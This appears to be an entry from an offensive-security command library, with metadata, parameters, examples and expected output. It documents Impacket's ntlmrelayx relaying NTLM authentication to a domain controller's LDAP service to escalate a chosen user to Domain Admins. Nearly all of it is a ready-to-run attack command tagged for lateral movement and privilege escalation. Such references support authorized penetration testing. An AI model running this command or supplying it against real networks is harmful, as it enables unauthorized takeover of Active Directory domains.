---
id: cc72aeab-1a9c-4dd8-9376-8b1c6bc31e0e
name: ntlmrelayx-escalate-user-via-ldap
type: command
executor: bash
data: 'ntlmrelayx.py -t ldap://$_DC_IP --escalate-user $_TARGET_USERNAME'
output: null
created_at: '2023-04-06T03:56:08.022494+00:00'
updated_at: '2023-04-10T20:26:32.381858+00:00'
platforms:
  - Linux
tags:
  - lateral-movement
  - privilege-escalation
verified: true
validated: true
---

# ntlmrelayx-escalate-user-via-ldap

## Command

```bash
ntlmrelayx.py -t ldap://$_DC_IP --escalate-user $_TARGET_USERNAME
```

## Description

Runs Impacket's ntlmrelayx to relay NTLM authentication to LDAP and escalate privileges for a specified user by modifying group memberships.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -t ldap://$_DC_IP | Target LDAP server (e.g., ldap://10.0.0.1) | Yes |
| --escalate-user $_TARGET_USERNAME | Username to escalate (e.g., lowprivuser) | Yes |

## Examples

### Basic Usage

```bash
ntlmrelayx.py -t ldap://dc01.domain.local --escalate-user lowprivuser
```

## Expected Output

Impacket v0.9.24
[*] Servers started, waiting for connections
[*] Received NTLM auth from MAIL01$
[*] Relaying credentials to ldap://dc01.domain.local
[*] Escalating lowprivuser to Domain Admins

## Related

- [[procedures/PrivExchange-Attack-with-NTLM-Relay]]
